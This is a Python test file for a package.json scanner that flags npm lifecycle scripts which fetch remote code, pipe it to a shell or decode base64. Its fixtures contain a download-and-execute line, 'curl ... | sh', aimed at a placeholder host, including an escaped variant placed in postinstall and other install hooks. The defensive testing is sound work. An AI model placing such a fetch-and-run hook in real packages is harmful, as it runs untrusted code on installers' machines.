import json

import pytest
from pathlib import Path

from dev_guard.checks import scan
from dev_guard.patterns import MAX_FILE_BYTES

FIXTURES = Path(__file__).parent / "fixtures" / "h3"
MALICIOUS = FIXTURES / "malicious"
CLEAN = FIXTURES / "clean"

# 1-based lines in tests/fixtures/h3/malicious/package.json
PREINSTALL_LINE, INSTALL_LINE, POSTINSTALL_LINE = 6, 7, 8

CURL_SH = "curl -s https://example.invalid/x | sh"
DEPTH = 100_000  # 5000 does not overflow json on py3.12


def got(findings, severity=None):
    return {(f.check_id, f.severity, f.pattern, f.line) for f in findings
            if severity is None or f.severity == severity}


def scan_text(tmp_path, text, name="package.json"):
    (tmp_path / name).write_text(text)
    return scan(tmp_path, extra_files=())


def nested(tail_scripts: str) -> str:
    return '{"x": ' + "[" * DEPTH + "]" * DEPTH + ", " + tail_scripts + "}"


def test_malicious_fixture():
    findings = scan(MALICIOUS, extra_files=())
    assert ("H3", "high", "network_fetch", POSTINSTALL_LINE) in got(findings)
    assert ("H3", "high", "remote_shell", POSTINSTALL_LINE) in got(findings)
    assert ("H3", "high", "base64_decode", PREINSTALL_LINE) in got(findings)
    assert ("H3", "med", "not_in_allowlist", INSTALL_LINE) in got(findings)
    assert len(findings) == 4  # build script with curl is not flagged
    assert all(f.check_id == "H3" for f in findings)


def test_clean_fixture():
    assert scan(CLEAN, extra_files=()) == []


def test_no_script_text_in_findings():
    assert "FAKE_SECRET_TOKEN_H3" not in repr(scan(MALICIOUS, extra_files=()))


def test_malformed_json(tmp_path):
    findings = scan_text(tmp_path, '{"scripts": {')
    assert [(f.check_id, f.severity, f.pattern) for f in findings] == [("H3", "low", "malformed_json")]


def test_deep_nesting_multiline(tmp_path):
    text = ('{\n"x": ' + "[" * DEPTH + "]" * DEPTH + ',\n"scripts": {\n'
            f'"postinstall": "{CURL_SH}"\n}}\n}}\n')
    findings = got(scan_text(tmp_path, text))
    assert ("H3", "low", "malformed_json", 1) in findings
    assert ("H3", "high", "network_fetch", 4) in findings
    assert ("H3", "high", "remote_shell", 4) in findings


def test_deep_nesting_minified(tmp_path):
    text = nested(f'"scripts": {{"build": "curl x", "postinstall": "{CURL_SH}"}}')
    assert len(text) > 5000
    findings = got(scan_text(tmp_path, text))
    assert ("H3", "low", "malformed_json", 1) in findings
    assert ("H3", "high", "network_fetch", 1) in findings
    assert ("H3", "high", "remote_shell", 1) in findings


def test_deep_nesting_escaped_value(tmp_path):
    text = nested('"scripts": {"postinstall": "\\u0063url -s https://example.invalid/x | sh"}')
    assert ("H3", "high", "network_fetch", 1) in got(scan_text(tmp_path, text))


def test_deep_nesting_oversize_value(tmp_path):
    text = nested('"scripts": {"postinstall": "curl ' + "a" * (5000 + 10) + '"}')
    findings = got(scan_text(tmp_path, text))
    assert ("H3", "high", "network_fetch", 1) in findings


def test_deep_nesting_only_build_curl(tmp_path):
    text = nested('"scripts": {"build": "curl x"}')
    assert not got(scan_text(tmp_path, text), "high")


def test_oversize_value(tmp_path):
    text = json.dumps({"scripts": {"postinstall": "curl " + "a" * 5000}}, indent=2)
    findings = scan_text(tmp_path, text)
    assert [(f.severity, f.pattern, f.line) for f in findings] == [("high", "network_fetch", 3)]


def test_non_dict_and_non_string(tmp_path):
    assert scan_text(tmp_path, '{"scripts": ["curl x"]}') == []
    assert scan_text(tmp_path, '{"scripts": {"postinstall": 5}}') == []
    assert scan_text(tmp_path, "[1, 2]") == []


def test_case_insensitive_name(tmp_path):
    text = json.dumps({"scripts": {"postinstall": CURL_SH}}, indent=2)
    assert ("H3", "high", "network_fetch", 3) in got(scan_text(tmp_path, text, "PACKAGE.JSON"))


def test_oversize_file(tmp_path):
    findings = scan_text(tmp_path, " " * (MAX_FILE_BYTES + 1))
    assert got(findings) == {("H3", "med", "oversize_file", 1)}


def test_symlinked_package_json(tmp_path):
    real = tmp_path / "real.txt"
    real.write_text("{}")
    (tmp_path / "package.json").symlink_to(real)
    assert got(scan(tmp_path, extra_files=())) == {("H3", "med", "symlinked_config", 1)}


@pytest.mark.parametrize("key", ["prepare", "prepublish", "prepublishOnly", "prepack", "postpack"])
def test_more_lifecycle_scripts(tmp_path, key):
    text = json.dumps({"scripts": {key: CURL_SH}}, indent=2)
    assert ("H3", "high", "network_fetch", 3) in got(scan_text(tmp_path, text))
